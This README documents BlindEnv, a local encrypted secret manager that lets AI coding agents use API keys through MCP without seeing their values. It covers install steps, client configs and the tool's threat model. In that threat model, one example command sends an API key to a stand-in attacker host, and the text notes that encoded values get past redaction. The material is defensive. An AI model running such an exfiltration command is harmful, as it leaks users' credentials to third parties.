# BlindEnv

**A local, encrypted secret manager for AI coding agents.** BlindEnv lets Claude Code, Cursor and opencode *use* your dev and pre-prod API keys without ever putting their values into the model's context window, its logs, or your chat transcripts.

Secrets are stored locally, encrypted with AES-256-GCM, and exposed to agents over the [Model Context Protocol](https://modelcontextprotocol.io) (MCP). Agents reference secrets by name; BlindEnv injects the real values at the last moment and redacts them from any output that comes back.

```
   Agent (Claude Code / Cursor / opencode)
        |  MCP (stdio): "run this with my secrets"
        v
   +-------------------------------------------+
   |  BlindEnv                                 |
   |    vault (AES-256-GCM, key in OS keyring) |
   |    inject into child env / HTTP request   |
   |    redact values from stdout/stderr       |
   +-------------------------------------------+
        |  redacted output + exit code
        v
   Agent sees the result, never the key
```

---

## Threat model (read this first)

BlindEnv is honest about what it does and does not protect against.

**It protects against:**

- Accidental leakage of secret values into the model context, tool results, logs and transcripts.
- Committing a `.env` file to git (there is no `.env`).
- Casual disk inspection: values are encrypted at rest; only names stay readable.

**It does NOT protect against:**

- **A malicious command exfiltrating a secret.** `execute_with_secrets` runs arbitrary commands with the secrets present in the child environment, and the agent influences which commands run. A command like `curl -d "$API_KEY" attacker.example` cannot be stopped by output redaction.
- **Transformed or encoded values.** Redaction matches the literal secret. If a command base64-encodes, reverses, truncates or hashes the value, redaction will miss it.
- **A compromised local account.** The vault is only as safe as your OS login and keyring.

In short: **redaction is data-loss prevention, not a security sandbox.** It is designed to stop accidental leakage, not a determined adversary. Keep production crown jewels out of any agent-facing vault.

Additional defaults that reduce risk:

- `execute_with_secrets` is **disabled per project** until you enable `allow_execute`.
- `list_secret_keys` returns names only, never values.
- A per-call audit log records key names, commands and redaction counts — never values.

---

## Features

- **Encrypted local vault** — embedded SQLite, per-value AES-256-GCM, master key in the OS keyring (macOS Keychain, Windows Credential Manager, Linux Secret Service) with a passphrase fallback for headless/CI.
- **MCP server (stdio)** with four tools: `list_secret_keys`, `get_context`, `proxy_http_request`, `execute_with_secrets`.
- **Redaction engine** — normalizes output encoding (including Windows PowerShell UTF-16), replaces values with `[BLINDENV_REDACTED:KEY]`, longest-first, with a minimum-length guard.
- **Bounded, timeout-safe execution** — command output is retained up to a fixed budget (100 KB) instead of buffered in full, so a verbose or runaway child cannot exhaust memory; on timeout the whole process tree is terminated, so a background descendant cannot keep a call open (this applies to `execute_with_secrets` and `blindenv run`).
- **Four-tier secret model** — a secret is defined in exactly one of four scopes, most specific wins: **project + environment** > **project-global** (all environments of a project) > **environment-global** (one environment shared by every project) > **global** (all projects, all environments).
- **Local dashboard** (`blindenv ui`) — master-detail scope navigation over the shared and project scopes, secrets defined vs inherited (with their source), a read-only effective-resolution view, reveal on demand, execution toggle, an on-demand audit slide-over and export/import backups. Bound to loopback and protected by a session token.
- **Portable backup** — export the vault (including the shared scopes) encrypted with a passphrase so it survives a lost keyring entry; backups written before shared scopes existed are still importable.
- **Single binary** — pure Go, no CGO, cross-compiles to Windows, macOS and Linux.

---

## Install

### From source (recommended)

```sh
git clone https://github.com/fernandoris/blindenv
cd blindenv
go build -o blindenv ./cmd/blindenv
```

Requires Go 1.24+.

### With `go install`

```sh
go install github.com/fernandoris/blindenv/cmd/blindenv@latest
```

### Updating

Check the version you are running:

```sh
blindenv version
```

Update with the same method you installed with:

```sh
# from a source checkout
cd blindenv && git pull && go build -o blindenv ./cmd/blindenv

# or, if the binary lives on your PATH via go install
go install github.com/fernandoris/blindenv/cmd/blindenv@latest
```

Then replace the binary on your `PATH` with the freshly built one. The dashboard
stylesheet is committed and embedded in the binary, so no extra build step is
needed. Configured agents do not need to change: each client launches
`blindenv mcp` on demand and picks up the new binary automatically.

Vault migrations run automatically the first time a newer version opens the
vault. They are applied in place and may be irreversible, so export a backup
before upgrading:

```sh
BLINDENV_BACKUP_PASSPHRASE='choose-something' blindenv backup export blindenv-backup.bin
```

---

## Quick start

```sh
# 1. Open the local dashboard (creates the vault and master key on first run)
blindenv ui
#    -> prints a URL with a token, e.g. http://127.0.0.1:8080/?token=...

# 2. In the dashboard: create a project (e.g. "my-api"),
#    add an environment (e.g. "staging"), and add your secrets.
#    Define a secret as global (all projects), environment-global
#    (one env, all projects), project-global (all envs of a project)
#    or project + environment; the most specific definition wins.

# 3. Configure your agent (see below) and let it use the secrets.
```

You can also back up your vault at any time:

```sh
BLINDENV_BACKUP_PASSPHRASE='choose-something' blindenv backup export blindenv-backup.bin
```

---

## Integrations

BlindEnv runs as an MCP server over stdio. Each client launches its own `blindenv mcp` process and receives the active project/environment from the config (`env` carries **context**, never secrets).

### opencode

`~/.config/opencode/opencode.jsonc`:

```json
{
  "$schema": "https://opencode.ai/config.json",
  "mcp": {
    "blindenv": {
      "type": "local",
      "command": ["blindenv", "mcp"],
      "enabled": true,
      "environment": {
        "BLINDENV_PROJECT": "my-api",
        "BLINDENV_ENV": "staging"
      }
    }
  }
}
```

### Claude Code

`~/.claude.json` (or a project-level `.mcp.json`):

```json
{
  "mcpServers": {
    "blindenv": {
      "command": "blindenv",
      "args": ["mcp"],
      "env": {
        "BLINDENV_PROJECT": "my-api",
        "BLINDENV_ENV": "staging"
      }
    }
  }
}
```

`claude_desktop_config.json` uses the same `mcpServers` shape.

### Cursor

`.cursor/mcp.json` (same shape as Claude Code):

```json
{
  "mcpServers": {
    "blindenv": {
      "command": "blindenv",
      "args": ["mcp"],
      "env": {
        "BLINDENV_PROJECT": "my-api",
        "BLINDENV_ENV": "staging"
      }
    }
  }
}
```

> On Windows, point `command` at the full path to `blindenv.exe` and let the client launch it directly. Do not wrap it in a PowerShell script: PowerShell can write to stdout and corrupt the MCP stream.

### Using an MCP tool

Once configured, the agent can ask for key names and run commands without seeing values:

```
list_secret_keys()                                   -> ["API_KEY", "DB_HOST", "REGION"]
execute_with_secrets(command="npm", args=["run","migrate"])
proxy_http_request(url="https://api.staging.example.com/me",
                   headers={"Authorization": "Bearer {{API_KEY}}"})
```

---

## CLI reference

| Command | Description |
| --- | --- |
| `blindenv mcp` | Run the MCP server over stdio. |
| `blindenv ui [--port N] [--dev]` | Start the local dashboard on `127.0.0.1`. |
| `blindenv run <project>/<env> -- <command> [args...]` | Run a command with secrets injected; output is redacted. |
| `blindenv backup export\|import <file>` | Write or restore a passphrase-encrypted backup. |
| `blindenv version` | Print version information. |

`blindenv` deliberately offers **no** subcommand that prints a secret value, so an agent with shell access cannot bypass redaction.

### Environment variables

| Variable | Purpose |
| --- | --- |
| `BLINDENV_VAULT` | Override the vault path (default: `<user config dir>/blindenv/vault.db`). |
| `BLINDENV_PROJECT` | Default project for the MCP server. |
| `BLINDENV_ENV` | Default environment for the MCP server. |
| `BLINDENV_CLIENT` | Client name recorded in the audit log. |
| `BLINDENV_PASSPHRASE` | Unlock the vault when no OS keyring is available (Docker/CI). |
| `BLINDENV_BACKUP_PASSPHRASE` | Passphrase for `backup export` / `backup import`. |

---

## How it works

- **Key management.** A random 32-byte master key lives in the OS keyring. Without a keyring, a passphrase is stretched with Argon2id using a persisted salt. The crypto layer only ever sees the 32-byte key.
- **Storage.** Each secret value is sealed with AES-256-GCM and a random nonce; project, environment and key names stay readable. Values are only plaintext in memory.
- **Resolution.** For a `(project, environment)`, the effective value is chosen by specificity: project + environment, then project-global, then environment-global, then global. When a key is defined in project-global and environment-global at once, project-global wins so a project can always shadow a shared environment default.
- **MCP tools.** `list_secret_keys` and `get_context` never return values. `proxy_http_request` substitutes `{{SECRET_NAME}}` tags inside BlindEnv and strips secret headers when a redirect crosses hosts. `execute_with_secrets` injects the resolved secrets into a child process, captures stdout/stderr, normalizes the encoding and redacts before returning. Capture retains a bounded prefix (100 KB), so a child's output volume cannot exhaust memory, and the 60 s timeout kills the whole process tree, so a background descendant cannot keep the call open.
- **Redaction.** Values are replaced longest-first with `[BLINDENV_REDACTED:KEY]`. Values shorter than 6 characters are not redacted (and are flagged when stored). `BLINDENV_*` variables are stripped from child environments so the master key and passphrase never leak to a command.

---

## Development

```sh
go test ./...                # unit tests (crypto, db, mcp, web, backup)
go vet ./...
CGO_ENABLED=0 go build ./...
```

The dashboard CSS is built with Tailwind and committed (`web/dist/app.css`) so the binary embeds it:

```sh
npx tailwindcss@3 -c tailwind.config.js -i web/src.css -o web/dist/app.css --minify
```

Run the UI against the on-disk assets during development:

```sh
go run ./cmd/blindenv ui --dev
```

See [CONTRIBUTING.md](CONTRIBUTING.md) for details.

---

## License

MIT — see [LICENSE](LICENSE).
